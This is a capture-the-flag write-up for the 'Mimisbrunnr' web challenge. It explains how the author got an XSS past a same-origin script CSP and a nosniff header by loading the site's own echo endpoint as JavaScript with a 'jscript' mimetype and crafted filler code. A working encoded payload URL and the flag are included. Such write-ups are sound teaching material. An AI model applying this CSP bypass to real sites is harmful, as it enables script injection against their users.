# Mimisbrunnr (web)

In the challenge we get a form where we should put a link to the same page, but with XSS vulnerability triggered, by showing `alert(1)`.
What we get to work with is a special page which can echo our inputs, but with a few difficulties:

1. There is `Content-Security-Policy script-src 'self'`, so we can load only javascript from the same host
2. There is `X-Content-Type-Options	nosniff` so scripts will load only if mimetype of the resource is correct
3. We get the echo from link `http://mimis.alieni.se:2999/xss?xss=OUR_INPUT&mimis=plain` as part of:

```

                              WELCOME, OUR_INPUT
    /h e h e//////////////////////////////////////////////////////////////////////////////////////`    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMMMNs:...-:/++osyhhdmmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMMh-  ``            ```..-://+osyyhdmmNNMMMMMMMMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMN/` `.............`````````        ````./dMMMMMMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMy.  ..................................... `+mMMMMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMm/` `------.............................-+s-  .sNMMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMy.  ...-------------------...............+o+o:`  :dMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMm+` `...................------------------:o+++o+.  .sNMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMh-  .:----............................----/oooooooo-   :dMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMNs`  .-----:-::--------....................-++++++oooo:`  `yNMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMN/  `.............-------::::----..........-++++++++oooo+.   +NMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMN:  `-......................---------:------/+++oooo++oooo+.   :mMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMh   .:::-----..........................----++++++++oooooooo+.   hMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMm:.``  ```...-::///:---...................:+++ooooooo++/:-.```.:mMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMNmdhyo+:-`   -oss+..--:::::::----......:++++ooss:-.`.-:+syhdmNMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMNh` `+osso/::-..``.+osooo+//::-/:-../oss`  +mNMMMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMo  .+syo++oossoooosossssssss-`    :oss`  /*∕MMMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMd` ./sy/   ``./sooosososssyy+/:-../+ss.  .yNMMMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMM. `:oy/      `` .-+osoooos//+oosso+sy+/-` /mMMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMM: `:oy/           :o-   ``      `//syosy+` .yNMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMM+ `:oy/           -o-            -:ss``+yo.  :dNMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMMs `:sy/           -o.            -:ss`  :ss-   .:o/*∕MMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMMs `:sy/           -o.            -:ss`   -os/``    `oMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMMs `:sy/           -/.            -:ss`    `/oo+:::  /MMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMNds. `:sy/           :+`            -:ss`        `.-`  /*∕MMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMNds+-`    .:syo/+osssooooo/oo+++//::--.` ::ss`    .osso+////*∕MMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMy.    `..-:::oyyyssyyyysyyy+syyyyyssssssss+:sy-`   :mMMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMh`   .-::::/ossyyyyyhhhhhhhh/shhhhhhhhhyyyyo:syss+/` `/dMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMM/  `---.-:oyyyhhhhhyhhhhhhhh/yhhhhhhhhhhhyho:syyssss/` `/*∕MMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMN.  /+-----+yyyyhhhyhhhhhhhhh/yhhhhhhhhhhhyho:syyyysss/  sMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMN.  +o/.``../oyyhhhhhhhhhhhhh+hhhhhhhhhhhhys/:syssssyyy. sMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMN.  /+/::-```.-::/+ossyhhhhhhshhhhhhyyso+//:--/o+ossyyy- oMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMN`  ++/:/:-:--......`.----:://://:::::::-://+oossssssss: -MMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMNNmdy/  `oo///:-:/::::::.-:------::-//++++oososssyysssyyssyy/  +hNMMMMMMMMMMMMN-    
    /*∕MMNhyo+/:-.``    `++///:::::::::---::://////:+ooosssssosssssssssssyyy+   `.:oymNMMMMMMMN-    
    /*∕Mh-          `..-:o+://::/::::--::---:::::/::/+oooooosyyssssyyyyyosyy+`       `:yNMMMMMN-    
    /*∕d`    ```..--::/++o+/::::///:::---:::::::::/:/+oooooosyyyssyyyyyssssso/:::`.`    :dMMMMN-    
    /*∕/    `..-::::::///so+///::///:::::::://////:/++ooooosssssssssssssyysysooo+///---  `sNMMN-    
    /*∕+   `----::::::://oso/+//://///:::::///////:/+++++osyyssyyyssysosyysysoooo+++++/``  +NMN-    
    /*∕m-  ``.-::::::::::+oo++++:::///:////:::::////++ooosyyyssyyyssssssssssoooooo+++++/:   dMN-    
    /*∕Mm:   `.-::::-::::::///++/////::///::///////+ooossssssssyyyssyssooooooo+++++++++/`  .mMN-    
    /*∕MMNo.   `.-----::::::::::::+++++++/:++++ooo+osssyyyysysoossooo++++++++++++++++//`  `/*∕N-    
    /*∕MMMMmy/.   `....-:-::::::::://:++/+/+/+o/+oo+osssssso+/+/+////+++++///+///+/:-``  `sMMMN-    
    /*∕MMMMMMMmh+-`    ..--------:::::::::::::::::::://///////////////++///:-:-:/:.    ./dMMMMN-    
    /*∕MMMMMMMMMMNdy/.`      `.......---::-:::::::::::::////://////:.--....    `.``.:ohNMMMMMMN-    
    /*∕MMMMMMMMMMMMMMNds+:.``          ``````...`-:-.....-::::::-..         `.-/oydNMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMNNmdyso+/:-.``                  `````      `.-/oydmNMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhysso+//:--....``````.-:/+sydmNMMMMMMMMMMMMMMMMMMMMMMMN-    
    /*∕MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN-    
    /*/ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo-- 
```

To overcome the first protection, we simply have to use the same page as the javascript source to load.
As our input we provide `<script src="/xss?xss=SOME_OTHER_INPUT&mimis=SOME_MIMETYPE"/>

To tackle the second protection we need to provide the right mime type for this script.
They were appending `text/` to whatever we provide, and `javascript` didn't work, but we checked other options is `jscript` worked fine.
So we can inject: `<script src="/xss?xss=SOME_OTHER_INPUT&mimis=jscript"/>

The last part requires that this ascii-art with our payload is correctly loaded as javascript source code.
First issue is the `WELCOME, ` part which comes before our payload.
`WELCOME` is not a known symbol in this context so it crashes.
But it seems javascript allows to call functions before they're declared, so we can inject `function WELCOME(){}` and it will work just fine.
Last step is to take care of the ascii-art, but this we can do by injecting `var ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo; /*`.
Block comment will take care of the most of the picture, and the var will handle the `ooooo`.

As a result the page we inject as source for script is: `http://mimis.alieni.se:2999/xss?xss=alert(1);%20function%20WELCOME(){};var%20ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo;%20/*&mimis=jscript`

And we inject this by `<html><head><script src="/xss?xss=alert(1); function WELCOME(){};
var ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo; /*&mimis=jscript"></script> </head></html>`

So the final encoded string is:
`http://mimis.alieni.se:2999/xss?xss=%3Chtml%3E%3Chead%3E%3Cscript%20src=%22/xss?xss=alert(1)%3b%20function%20WELCOME(){}%3b%0Avar%20ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo%3b%20%2f*%26mimis=jscript%22%3E%3C/script%3E%20%3C/head%3E%3C/html%3E&mimis=html`

And by submitting this we get back the flag: `midnightsun{t3xt_1z_d@ng3r00ze!!}`
